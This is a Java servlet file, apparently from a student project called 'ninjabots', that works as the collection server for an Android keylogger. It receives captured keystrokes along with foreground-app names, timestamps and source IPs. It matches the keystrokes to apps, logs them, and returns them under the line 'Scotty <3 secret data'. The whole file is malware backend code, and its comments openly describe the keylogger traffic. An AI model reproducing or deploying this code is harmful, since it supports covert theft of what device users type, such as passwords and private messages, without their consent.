package com.cmusv.ninjabots;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Logger;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.cmusv.ninjabots.shared.MobileApp;

@SuppressWarnings("serial")
public class NinjabotscmuServlet extends HttpServlet {
	private static final Logger logger = 
			Logger.getLogger(NinjabotscmuServlet.class.getName());
	private List<MobileApp> appList = new ArrayList<MobileApp>();

		
	public void doGet(HttpServletRequest req, HttpServletResponse resp)
			throws IOException {
		
		String appName = req.getParameter("appName");
		String keyInput = req.getParameter("keyInput");
		String timeStamp = req.getParameter("timeStamp");
		String srcIP = req.getParameter("srcIP");
		StringBuilder receivedParams = new StringBuilder();
		resp.setContentType("text/plain");

		//receivedParams.append("\n" + "timeStamp : " + timeStamp + "\n");
		//receivedParams.append("srcIP : " + srcIP + "\n");		
		if(timeStamp!=null && srcIP!=null)
		{
			if (appName != null)
			{
				MobileApp curApp = new MobileApp();
				curApp.setAppName(appName);
				curApp.setSrcIP(srcIP);
			    curApp.setTimeStamp(timeStamp);
			    //TODO:check if AppName is not the same as previous entry in the arraylist
			    appList.add(curApp);
				//System.out.println(curApp.getAppName()+" *************************");
				//receivedParams.append("appName : " + appName);
			}
			StringBuilder appdetails = new StringBuilder();
			if (keyInput != null)
			{
				for(int i=1;i<appList.size();i++)
				{
					// Assuming keylogger is sent once per second. This should
					// not be a problem since we will send keylogger data only
					// when there is anything to send otherwise we wont make a
					// call to the server. This is a temporary change that needs
					// to be done the android app side for making things easier
					// for us
				//	System.out.println(appList.get(i).getAppName()+" *************************");
					Double dTime = Double.parseDouble(timeStamp);
					StringBuilder keylogger = new StringBuilder();
					if(dTime > Double.parseDouble(appList.get(i-1).getTimeStamp()) 
							&& dTime <= Double.parseDouble(appList.get(i).getTimeStamp()))
					{
						keylogger.append(keyInput);
					}
					appdetails.append(appList.get(i-1).getAppName()+ keylogger.toString());
					//TODO:add json object- AppName and keylogger
				}
				receivedParams.append("keyInput : " + keyInput);
				resp.getWriter().println("Scotty <3 secret data");
				resp.getWriter().println(appdetails);
			}
		}
		logger.info(receivedParams.toString());

		
	}
	
	public void doPost(HttpServletRequest req, HttpServletResponse resp) 
		throws IOException {
		
		doGet(req, resp);
	}
}
